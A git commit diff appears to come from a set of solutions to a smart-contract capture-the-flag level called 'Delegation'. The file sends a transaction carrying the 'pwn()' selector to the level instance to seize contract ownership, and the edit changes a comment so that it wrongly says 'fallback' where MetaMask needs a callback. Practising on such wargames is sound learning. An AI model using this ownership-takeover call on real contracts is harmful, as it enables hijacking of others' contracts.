8ae25410b817109dc6c3b635530c0bbcc62cdedf
NotSurprised <roro8016489@gmail.com>
2019-03-25 22:00:33 +0800

    20190325

--- 06.Delegation/Delegation1.js
+++ 06.Delegation/Delegation1.js
@@ -1,4 +1,4 @@
 contract.owner()
 web3.eth.sendTransaction({from:player,to:instance,data:web3.sha3("pwn()").slice(0,10),gas: 1111111},function(x,y){console.error(y)});
-//The MetaMask Web3 object does not support synchronous methods like eth_sendTransaction without a callback parameter.
+//The MetaMask Web3 object does not support synchronous methods like eth_sendTransaction without a fallback parameter.
 contract.owner()
